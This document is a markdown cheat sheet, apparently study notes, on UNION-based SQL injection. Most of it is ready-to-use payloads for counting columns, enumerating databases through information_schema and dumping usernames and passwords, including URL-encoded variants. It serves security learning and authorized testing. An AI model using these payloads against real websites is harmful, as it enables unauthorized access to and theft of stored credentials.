# SQL Injection - UNION Clause

## UNION Basics

UNION combines results from multiple SELECT statements into one output.

### Example
```sql
SELECT * FROM ports UNION SELECT * FROM ships;
-- Combines rows from both tables
```

---

## Important Rules

| Rule | Explanation |
|------|-------------|
| **Same number of columns** | Both SELECT statements must have equal columns |
| **Same data types** | Columns must have compatible data types |
| **Column names** | Result uses column names from the first SELECT |

### Error Example
```sql
SELECT city FROM ports UNION SELECT * FROM ships;
-- ERROR: Different number of columns (1 vs 2)
```

---

## UNION Injection Commands

### Basic UNION Injection
```
' UNION SELECT 1-- -                    # Test number of columns
' UNION SELECT 1,2-- -                  # Find 2 columns
' UNION SELECT 1,2,3-- -                # Find 3 columns
' UNION SELECT 1,2,3,4-- -              # Find 4 columns
```

### With Original Query
```
1' UNION SELECT username,password FROM users-- -
admin' UNION SELECT 1,2,3 FROM users-- -
' UNION SELECT database(),user()-- -
```

---

## Handling Uneven Columns

### Fill With Junk Data
```sql
' UNION SELECT username, 2 FROM passwords-- -       # 2 columns
' UNION SELECT username, 2, 3 FROM passwords-- -    # 3 columns
' UNION SELECT username, 2, 3, 4 FROM passwords-- - # 4 columns
' UNION SELECT NULL, NULL, NULL-- -                 # NULL fits all types
```

### Column Counting Commands
```
' ORDER BY 1-- -          # Test if column 1 exists
' ORDER BY 2-- -          # Test if column 2 exists
' ORDER BY 3-- -          # Test if column 3 exists
' ORDER BY 4-- -          # Continue until error
' UNION SELECT NULL-- -   # Start with 1 column
' UNION SELECT NULL,NULL-- -  # Try 2 columns
' UNION SELECT NULL,NULL,NULL-- -  # Try 3 columns
```

---

## Database Enumeration with UNION

### Get Database Info
```sql
' UNION SELECT database()-- -       # Current database
' UNION SELECT user()-- -           # Current user
' UNION SELECT version()-- -        # Database version
' UNION SELECT @@datadir-- -        # Data directory
```

### List Databases
```sql
' UNION SELECT schema_name FROM information_schema.schemata-- -
' UNION SELECT schema_name FROM information_schema.schemata LIMIT 1-- -
' UNION SELECT schema_name FROM information_schema.schemata LIMIT 1,1-- -
```

### List Tables
```sql
' UNION SELECT table_name FROM information_schema.tables-- -
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='database_name'-- -
```

### List Columns
```sql
' UNION SELECT column_name FROM information_schema.columns-- -
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'-- -
```

### Dump Data
```sql
' UNION SELECT username,password FROM users-- -
' UNION SELECT id,username,password FROM users-- -
' UNION SELECT column1,column2,column3 FROM table_name-- -
```

---

## Multi-Column Extraction

### When You Don't Know Column Count
```sql
# Try incrementing columns until query works
' UNION SELECT 1-- -
' UNION SELECT 1,2-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT 1,2,3,4-- -
```

### Extract Multiple Values
```sql
# Combine data into one column
' UNION SELECT CONCAT(username,':',password) FROM users-- -

# Multiple columns with data
' UNION SELECT username,password,email FROM users-- -

# With WHERE clause
' UNION SELECT username,password FROM users WHERE id=1-- -
```

---

## Complete Payload Examples

| Payload | Purpose |
|---------|---------|
| `' UNION SELECT NULL-- -` | Test 1 column |
| `' UNION SELECT NULL,NULL-- -` | Test 2 columns |
| `' UNION SELECT NULL,NULL,NULL-- -` | Test 3 columns |
| `' UNION SELECT database(),user(),version()-- -` | Get DB info |
| `' UNION SELECT table_name,2 FROM information_schema.tables-- -` | List tables |
| `' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -` | List columns |
| `' UNION SELECT username,password FROM users-- -` | Dump credentials |
| `' UNION SELECT CONCAT(id,':',username,':',password) FROM users-- -` | Combined output |

---

## URL Encoded Versions
```
%27%20UNION%20SELECT%20NULL--%20-        # ' UNION SELECT NULL-- -
%27%20UNION%20SELECT%20NULL%2CNULL--%20- # ' UNION SELECT NULL,NULL-- -
%27%20ORDER%20BY%201--%20-               # ' ORDER BY 1-- -
```

---

## Key Takeaways

1. **Find column count** first using `ORDER BY` or `UNION SELECT NULL`
2. **Match column count** between original and injected query
3. **Use numbers or NULL** to fill extra columns
4. **information_schema** contains metadata about the database
5. **CONCAT()** combines multiple columns into one output
6. Always use `-- -` or `#` to comment out the rest

---

> ⚠️ **Warning:** Use only on authorized systems for security testing.
